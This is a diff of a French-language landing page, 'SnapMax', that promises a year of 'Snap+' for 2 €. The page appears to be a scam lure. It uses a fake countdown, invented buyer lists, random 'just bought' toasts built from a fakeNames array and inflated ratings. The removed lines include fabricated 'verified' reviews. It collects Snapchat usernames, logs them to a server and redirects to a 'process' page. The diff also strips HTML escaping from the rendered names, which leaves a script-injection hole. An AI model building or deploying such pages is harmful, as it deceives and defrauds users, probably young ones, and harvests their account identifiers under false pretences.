@@ -3,12 +3,12 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>SnapMax — Récupère 1 an de Snap+</title>
+  <title>SnapMax — 1 an de Snap+</title>
   <link rel="icon" type="image/png" href="/logo.png?v=2" />
   <style>
     :root{
       --bg:#0b0b10;--panel:#0f1018;--panel2:#0d0e15;--line:#24283a;--text:#f7f7fb;--muted:#a3a3b2;
-      --grad1:#ffd36e;--grad2:#ff79d1;--ok:#23c77d;--chip:#1a442b;--radius:18px;
+      --grad1:#ffd36e;--grad2:#ff79d1;--ok:#23c77d;--radius:18px;
     }
     *{box-sizing:border-box}
     html,body{margin:0;background:var(--bg);color:var(--text);font:16px/1.55 system-ui,-apple-system,Segoe UI,Roboto,Inter}
@@ -42,19 +42,10 @@
     @media(max-width:980px){.features{grid-template-columns:1fr}}
     .feature{border:1px solid var(--line);background:#0f1119;border-radius:14px;padding:16px}
 
-    .reviews{margin-top:18px}
-    .reviews-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
-    @media(max-width:980px){.reviews-grid{grid-template-columns:1fr}}
-    .rev{border:1px solid var(--line);background:#0f1119;border-radius:14px;padding:16px}
-    .avatar{width:26px;height:26px;border-radius:50%;background:#222;color:#bbb;display:flex;align-items:center;justify-content:center;font-weight:800;margin-right:8px}
-    .rev-row{display:flex;align-items:center;margin-bottom:10px}
-    .stars{color:#ffcc66;margin-left:34px}
-
     .offer{margin-top:18px;border:1px solid var(--line);background:var(--panel);border-radius:16px;padding:16px}
     .count{font-size:32px;font-weight:900;letter-spacing:1px}
     .input{width:100%;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#0c0d14;color:#fff}
     .cta{margin-top:12px;background:linear-gradient(90deg,var(--grad1),var(--grad2));color:#212127;border:0;padding:14px;border-radius:14px;font-weight:900;cursor:pointer;width:100%}
-    .footnote{color:var(--muted);font-size:12px;margin-top:10px}
 
     /* Toasts */
     .toasts{position:fixed;right:16px;bottom:16px;display:grid;gap:8px;width:min(320px,90vw);z-index:50}
@@ -79,7 +70,7 @@
     <!-- HERO -->
     <section class="hero">
       <h1>Récupère 1 an de Snap+</h1>
-      <p class="muted">Design original, offre 2€, et preuves sociales dynamiques.</p>
+      <p class="muted">Design d’origine conservé, offre 2 €, et preuves sociales.</p>
 
       <!-- KPIs -->
       <div class="kpi-grid">
@@ -89,7 +80,7 @@
         <div class="kpi"><div class="big">4.8/5</div><div class="sub">Satisfaction</div></div>
       </div>
 
-      <!-- TICKER “Ils viennent d’acheter” -->
+      <!-- “Ils viennent d’acheter” -->
       <div class="card">
         <div class="row" style="justify-content:space-between">
           <div class="row" style="gap:10px;align-items:center">
@@ -99,66 +90,17 @@
           <div class="chip">+ 3 129</div>
         </div>
 
-        <div class="buy-list" id="buy-list">
-          <!-- lignes ajoutées en JS -->
-        </div>
+        <div class="buy-list" id="buy-list"></div>
       </div>
 
-      <!-- Features -->
+      <!-- Features (look ancien) -->
       <div class="features">
         <div class="feature"><h3 style="margin:0 0 8px">Activation rapide</h3><p class="muted">Accès en quelques minutes après confirmation.</p></div>
-        <div class="feature"><h3 style="margin:0 0 8px">Priorité premium</h3><p class="muted">Traitement prioritaire sur certaines fonctionnalités.</p></div>
-        <div class="feature"><h3 style="margin:0 0 8px">Sans engagement</h3><p class="muted">Tu arrêtes quand tu veux, en 2 clics.</p></div>
-        <div class="feature"><h3 style="margin:0 0 8px">Support réactif</h3><p class="muted">Nos réponses rapides aux questions essentielles.</p></div>
-        <div class="feature"><h3 style="margin:0 0 8px">Prix unique</h3><p class="muted">2€ au lieu de 47,99€ — offre limitée.</p></div>
-        <div class="feature"><h3 style="margin:0 0 8px">Sécurisé</h3><p class="muted">Données traitées selon les bonnes pratiques.</p></div>
+        <div class="feature"><h3 style="margin:0 0 8px">Priorité premium</h3><p class="muted">Certaines fonctionnalités prioritaires.</p></div>
+        <div class="feature"><h3 style="margin:0 0 8px">Sans engagement</h3><p class="muted">Arrête quand tu veux, en 2 clics.</p></div>
       </div>
 
-      <!-- Avis -->
-      <div class="reviews">
-        <div class="row" style="justify-content:space-between;align-items:center">
-          <div class="row" style="gap:10px;align-items:center">
-            <img src="/logo.png" alt="" style="width:18px;height:18px;border-radius:4px;opacity:.9">
-            <strong>Avis vérifiés</strong>
-          </div>
-          <div class="chip" style="background:#14231a;border-color:#224a31;color:#b9ffd9">4.8/5</div>
-        </div>
-
-        <div class="reviews-grid" style="margin-top:10px">
-          <div class="rev">
-            <div class="rev-row"><div class="avatar">M</div><div><strong>Mélanie P.</strong></div></div>
-            <div class="stars">★★★★★</div>
-            <p class="muted">J’ai reçu mon accès en 2 minutes, nickel 👌</p>
-          </div>
-          <div class="rev">
-            <div class="rev-row"><div class="avatar">A</div><div><strong>Adam L.</strong></div></div>
-            <div class="stars">★★★★★</div>
-            <p class="muted">Simple et rapide. Rien à dire.</p>
-          </div>
-          <div class="rev">
-            <div class="rev-row"><div class="avatar">I</div><div><strong>Inès R.</strong></div></div>
-            <div class="stars">★★★★★</div>
-            <p class="muted">J’étais sceptique… mais ça marche. Merci.</p>
-          </div>
-          <div class="rev">
-            <div class="rev-row"><div class="avatar">L</div><div><strong>Lucas D.</strong></div></div>
-            <div class="stars">★★★★★</div>
-            <p class="muted">Support réactif, au top.</p>
-          </div>
-          <div class="rev">
-            <div class="rev-row"><div class="avatar">N</div><div><strong>Nora Z.</strong></div></div>
-            <div class="stars">★★★★★</div>
-            <p class="muted">Bonne affaire pour 2€.</p>
-          </div>
-          <div class="rev">
-            <div class="rev-row"><div class="avatar">Y</div><div><strong>Yanis G.</strong></div></div>
-            <div class="stars">★★★★★</div>
-            <p class="muted">Clairement le meilleur plan.</p>
-          </div>
-        </div>
-      </div>
-
-      <!-- Offre + Compteur + Form -->
+      <!-- Offre + compteur + form -->
       <div class="offer" id="acheter">
         <div class="row" style="gap:10px;align-items:center;margin-bottom:10px">
           <div style="display:flex;align-items:center;gap:8px"><span style="color:#ffae6a">⚡</span><strong>OFFRE LIMITÉE — PLUS QUE</strong></div>
@@ -169,30 +111,22 @@
           <div class="kpi" style="flex:0 0 auto;padding:8px 12px"><div class="big" style="font-size:20px">2€</div></div>
           <div class="muted">au lieu de 47,99€ pour 1 an complet</div>
         </div>
-        <input id="snuser" class=<input id="snuser" class="input" placeholder="Nom d’utilisateur Snapchat (ex: enzo_lol)" />
-        <button id="cta" class="<a id="cta" href="#" class="cta">Obtenir Snap+ maintenant 🔒</a>
-        <p class="footnote">Démo non affiliée à Snap Inc. — Utilise seulement des visuels dont tu détiens les droits. <a href="/messages.html" class="muted">Voir messages</a></p>
+
+        <!-- ⚠️ IMPORTANT : IDs à ne pas modifier -->
+        <input id="snuser" class="input" placeholder="Nom d’utilisateur Snapchat (ex: enzo_lol)">
+        <a id="cta" href="#" class="cta">Obtenir Snap+ maintenant 🔒</a>
+        <p class="muted" style="font-size:12px;margin-top:8px">Démo pédagogique — non affiliée à Snap Inc.</p>
       </div>
     </section>
   </main>
 
-  <!-- Toasts -->
+  <!-- Toasts visuels (bas droite) -->
   <div class="toasts" id="toasts"></div>
 
   <script>
-    // --- Endpoints relatifs (Vercel) ---
-    const LOG_API = "/api/log";
-    const MSG_API = "/api/messages"; // utilisé si tu ajoutes un aperçu ailleurs
-
-    // Utils
-    const $ = (s)=>document.querySelector(s);
-    const esc=(s='')=>s.replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
-    const sleep=(ms)=>new Promise(r=>setTimeout(r,ms));
-
-    // Compte à rebours 15 min
+    // --- Compte à rebours 15 min ---
     (function countdown(dur=15*60){
-      let s=dur;
-      const el=$("#count");
+      let s=dur; const el=document.getElementById("count");
       function tick(){
         const m=Math.floor(s/60), ss=String(s%60).padStart(2,"0");
         el.textContent=`${String(Math.floor(m/60)).padStart(2,"0")}:${String(m%60).padStart(2,"0")}:${ss}`;
@@ -201,140 +135,74 @@
       tick();
     })();
 
-    // Logs
+    // --- Endpoints (relatifs pour Vercel) ---
+    const LOG_API = "/api/log";
+
     async function sendLog(evt){
-      const r = await fetch(LOG_API,{
-        method:"POST",
-        headers:{ "Content-Type":"application/json" },
-        body: JSON.stringify({ ...evt, path: location.pathname })
-      });
-      const j = await r.json().catch(()=>({}));
-      if(!r.ok || j.ok===false) throw new Error(j.error||("HTTP "+r.status));
-      return j;
+      try{
+        await fetch(LOG_API,{
+          method:"POST",
+          headers:{ "Content-Type":"application/json" },
+          body: JSON.stringify({ ...evt, path: location.pathname })
+        });
+      }catch(e){/* on n'empêche pas la redirection */}
     }
 
-    // CTA
-    $("#cta").addEventListener("click", async ()=>{
-      const u = ($("#snuser")?.value||"").trim();
-      if(!u){ alert("Entre ton pseudo Snapchat 🙂"); return; }
-      try{
-        await sendLog({ event_type:"checkout_start", user_name:u });
-        showToast(`@${u} vient de lancer l'achat`);
-      }catch(e){
-        alert("Échec de l’envoi. Réessaie.");
-        console.warn(e);
-      }
-    });
+    // --- CTA : log + redirection vers /process.html ---
+    (function attachCTA(){
+      const btn = document.getElementById("cta");
+      const input = document.getElementById("snuser");
+      if(!btn || !input) return;
 
-    // Liste “Ils viennent d’acheter”
+      btn.addEventListener("click", async (e)=>{
+        e.preventDefault();
+        const u = (input.value || "").trim();
+        if(!u){ alert("Entre ton pseudo Snapchat 🙂"); return; }
+
+        await sendLog({ event_type:"checkout_start", user_name:u });
+        window.location.href = "/process.html?u=" + encodeURIComponent(u);
+      });
+    })();
+
+    // --- Preuves sociales : liste + toasts ---
     const starters = [
       {name:"maria_e", ago:"il y a 8m"},
       {name:"emma-k", ago:"il y a 10m"},
       {name:"kylianx", ago:"il y a 12m"},
       {name:"enzo_lol", ago:"il y a 10s"},
     ];
-    const buyList = $("#buy-list");
+    const buyList = document.getElementById("buy-list");
     function row(name,ago){
-      const initial = esc(name[0]||"?").toUpperCase();
+      const initial = (name[0]||"?").toUpperCase();
       return `
         <div class="buy-row">
           <div class="badge-dot">${initial}</div>
           <div>
-            <div class="bname">${esc(name)}</div>
-            <div class="btime">${esc(ago)}</div>
+            <div class="bname">${name}</div>
+            <div class="btime">${ago}</div>
           </div>
           <div class="chip">✓ Snap+</div>
         </div>`;
     }
-    function renderList(){
-      buyList.innerHTML = starters.map(x=>row(x.name,x.ago)).join("");
-    }
+    function renderList(){ buyList.innerHTML = starters.map(x=>row(x.name,x.ago)).join(""); }
     renderList();
 
-    // Toasts bas droite (achats aléatoires)
+    const toastsBox = document.getElementById("toasts");
     const fakeNames = ["enzo_lol","mila_snap","axel.93","nora_dev","yanisx","lea__","momo.z","clara_t","imad75","sarah_2"];
-    const toasts = $("#toasts");
     function showToast(text){
       const el=document.createElement("div");
       el.className="toast";
-      el.innerHTML=`<div class="ok"></div><div>${esc(text)}</div>`;
-      toasts.appendChild(el);
+      el.innerHTML=`<div class="ok"></div><div>${text}</div>`;
+      toastsBox.appendChild(el);
       requestAnimationFrame(()=>el.classList.add("show"));
       setTimeout(()=>{el.classList.remove("show"); setTimeout(()=>el.remove(),300);}, 4000);
     }
-    (async function loopToasts(){
-      while(true){
-        await sleep(6000 + Math.random()*6000);
+    (function loopToasts(){
+      setInterval(()=>{
         const name = fakeNames[Math.floor(Math.random()*fakeNames.length)];
         showToast(`@${name} vient d'acheter 1 an Snap+`);
-      }
+      }, 6000 + Math.random()*6000);
     })();
   </script>
-  <script>
-  // Endpoints locaux
-  const LOG_API = "/api/log";
-
-  async function sendLog(evt){
-    try{
-      const r = await fetch(LOG_API,{
-        method:"POST",
-        headers:{ "Content-Type":"application/json" },
-        body: JSON.stringify({ ...evt, path: location.pathname })
-      });
-      await r.json().catch(()=>({}));
-    }catch(e){ /* on ignore l'erreur, on redirige quand même */ }
-  }
-
-  // === REDIRECTION CTA ===
-  (function attachCTA(){
-    const btn = document.getElementById("cta") || document.getElementById("acheter");
-    if(!btn) return;
-
-    btn.addEventListener("click", async (e)=>{
-      e.preventDefault();
-      const u = (document.getElementById("snuser")?.value || "").trim();
-      if(!u){ alert("Entre ton pseudo Snapchat 🙂"); return; }
-
-      // 1) on log l'événement (non bloquant)
-      await sendLog({ event_type:"checkout_start", user_name:u });
-
-      // 2) on redirige vers la page de traitement
-      const next = "/process.html?u=" + encodeURIComponent(u);
-      window.location.href = next;
-    });
-  })();
-</script>
-  <script>
-  // Endpoint (facultatif, pour logger l’événement côté serveur)
-  const LOG_API = "/api/log";
-
-  async function sendLog(evt){
-    try{
-      const r = await fetch(LOG_API, {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({ ...evt, path: location.pathname })
-      });
-      await r.json().catch(()=>({}));
-    } catch(e) { /* on ignore les erreurs, on redirige quand même */ }
-  }
-
-  (function attachCTA(){
-    const btn = document.getElementById("cta");
-    if (!btn) return; // sécurité
-
-    btn.addEventListener("click", async (e)=>{
-      e.preventDefault();
-      const u = (document.getElementById("snuser")?.value || "").trim();
-      if(!u){ alert("Entre ton pseudo Snapchat 🙂"); return; }
-
-      // 1) log (non bloquant)
-      await sendLog({ event_type: "checkout_start", user_name: u });
-
-      // 2) redirection vers la page “analyse”
-      window.location.href = "/process.html?u=" + encodeURIComponent(u);
-    });
-  })();
-</script>
 </body>
 </html>
